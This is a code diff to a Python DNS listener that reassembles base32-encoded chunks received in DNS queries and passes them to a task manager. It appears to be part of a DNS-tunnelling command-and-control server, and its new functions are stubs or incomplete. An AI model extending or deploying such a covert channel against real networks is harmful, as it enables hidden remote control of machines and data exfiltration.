@@ -3,6 +3,24 @@ import struct
 
 HOST = ('192.168.56.1', 53) #server address
 
+def decode_base32(data :str) -> str:
+    pass
+    return ""
+
+def receiv_result(s :socket.socket) -> str:
+    domain_tmp = {}
+    while True:
+        data, address = s.recvfrom(1024)
+        if data[:-21][-3:] != "end":
+            domain_tmp[999] = data[:-24]
+            break
+        
+        domain_tmp[data[:-21][-2:]] = data[:-24]
+
+    result = [domain_tmp[i] for i in sorted(domain_tmp.keys())]
+    return "".join(result)
+
+
 def run_dns(stop_event, task_manager):
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0) as s:
         s.bind(HOST)
@@ -60,7 +78,17 @@ def run_dns(stop_event, task_manager):
                 finally:
                     connection.close()
 
-            elif domain[:-16] == "window":
+            elif domain[:-16][-1:] == "r":
+                connection = task_manager.get_connection()
+                result_base32 = receiv_result(s)
+                result = decode_base32(result_base32)
+
+                try:
+                    pass
+
+                finally:
+                    connection.close()
+
                 pass
 
     print("[+/DNS] dns-слушатель прекратил работу.")
